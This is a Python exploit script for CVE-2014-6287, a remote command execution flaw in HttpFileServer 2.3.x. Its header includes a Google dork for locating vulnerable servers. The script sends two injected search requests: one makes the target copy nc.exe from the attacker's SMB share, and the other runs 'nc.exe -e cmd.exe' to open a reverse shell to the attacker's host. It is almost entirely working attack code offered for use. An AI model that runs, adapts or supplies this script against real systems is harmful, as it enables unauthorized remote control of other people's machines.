#!/usr/bin/env python3

# Exploit Title: HttpFileServer 2.3.x Remote Command Execution
# Google Dork: intext:"httpfileserver 2.3"
# Date: 07-03-2024
# Author: zhsh
# Remote: Yes
# Exploit Author: Avinash Kumar Thapa aka "-Acid"
# Vendor Homepage: http://rejetto.com/
# Software Link: http://sourceforge.net/projects/hfs/
# Version: 2.3.x
# Tested on: Windows Server 2008 , Windows 8, Windows 7
# CVE : CVE-2014-6287
# Description: You can use impacket-smbserver to host nc.exe (under share) and use this script to exploit the vulnerability.

import argparse
import requests
from urllib.parse import quote

parser = argparse.ArgumentParser(description='Exploit for CVE-2014-6287')
parser.add_argument("--rhost", help="Remote IP address", required=True)
parser.add_argument("--rport", help="Remote Port number", required=True)
parser.add_argument("--lhost", help="Local IP address", required=True)
parser.add_argument("--lport", help="Local Port number", required=True)
parser.add_argument("--smb_workgroup", help="SMB workgroup", required=False, default="share")
parser.add_argument("--nc_name", help="Name of the nc.exe file", required=False, default="nc.exe")
parser.add_argument("--headers", help="Customized header to use for the GET request, e.g. User-Agent:XXX,Accept:application/json", required=False, default=None)
parser.add_argument("--proxy", help="Proxy to use for requests, e.g. 127.0.0.1:8080", required=False, default=None)

args = parser.parse_args()
base_dir = "C:\\Users\\Public\\"
headers, proxies = None, None

class colors:
    reset = '\033[0m'
    gold = '\033[33m'
    green = '\033[32m'
    red = '\033[31m'

print(colors.gold + \
"""

 ██████╗██╗   ██╗███████╗      ██████╗  ██████╗  ██╗██╗  ██╗       ██████╗ ██████╗  █████╗ ███████╗
██╔════╝██║   ██║██╔════╝      ╚════██╗██╔═████╗███║██║  ██║      ██╔════╝ ╚════██╗██╔══██╗╚════██║
██║     ██║   ██║█████╗  █████╗ █████╔╝██║██╔██║╚██║███████║█████╗███████╗  █████╔╝╚█████╔╝    ██╔╝
██║     ╚██╗ ██╔╝██╔══╝  ╚════╝██╔═══╝ ████╔╝██║ ██║╚════██║╚════╝██╔═══██╗██╔═══╝ ██╔══██╗   ██╔╝ 
╚██████╗ ╚████╔╝ ███████╗      ███████╗╚██████╔╝ ██║     ██║      ╚██████╔╝███████╗╚█████╔╝   ██║  
 ╚═════╝  ╚═══╝  ╚══════╝      ╚══════╝ ╚═════╝  ╚═╝     ╚═╝       ╚═════╝ ╚══════╝ ╚════╝    ╚═╝  
                                                                                                   
""" + colors.reset + "\t\t\t\t" + colors.green + "Authors: __zhsh9__" + colors.reset + "\n")

# Parse the header string into a dictionary
def parse_headers(header_string):
    headers = {}
    if header_string:
        # Split the string into individual headers on comma, then split on colon to get key-value pairs
        for header_pair in header_string.split(','):
            key, value = header_pair.split(':', 1)
            headers[key.strip()] = value.strip()

# Parse the proxies dictionary
def parse_proxy(proxy_string):
    proxies = {}
    if proxy_string:
        proxies = {
            'http': f'http://{proxy_string}',
            'https': f'http://{proxy_string}'
        }
    return proxies

# POC: http://<TARGET_IP>:<PORT>/?search=%00{.exec|<CMD>.}
download_nc_cmd = f"type \\{args.lhost}\{args.smb_workgroup}\{args.nc_name} > {base_dir}nc.exe"
revshell_cmd    = f"{base_dir}nc.exe -e cmd.exe {args.lhost} {args.lport}"

download_nc = f"http://{args.rhost}:{args.rport}/?search=%00{{.exec|{quote(download_nc_cmd)}.}}"
revshell    = f"http://{args.rhost}:{args.rport}/?search=%00{{.exec|{quote(revshell_cmd)}.}}"

# Parse headers and proxy
if args.headers:
    headers = parse_headers(args.headers)
if args.proxy:
    proxies = parse_proxy(args.proxy)

def exp():
    try:
        print(colors.gold + f"[*] Downloading nc.exe from SMB server: \\{args.lhost}\{args.smb_workgroup}" + colors.reset)
        requests.get(download_nc, headers=headers, proxies=proxies)
        print(colors.green + "[+] nc.exe downloaded successfully" + colors.reset)

        print(colors.gold + "[*] Executing nc.exe" + colors.reset)
        requests.get(revshell, headers=headers, proxies=proxies)
        print(colors.green + "[+] nc.exe executed successfully" + colors.reset)
        
    except Exception as e:
        print(colors.red + "[-] Something went wrong: " + str(e) + colors.reset)


if __name__ == "__main__":
    exp()
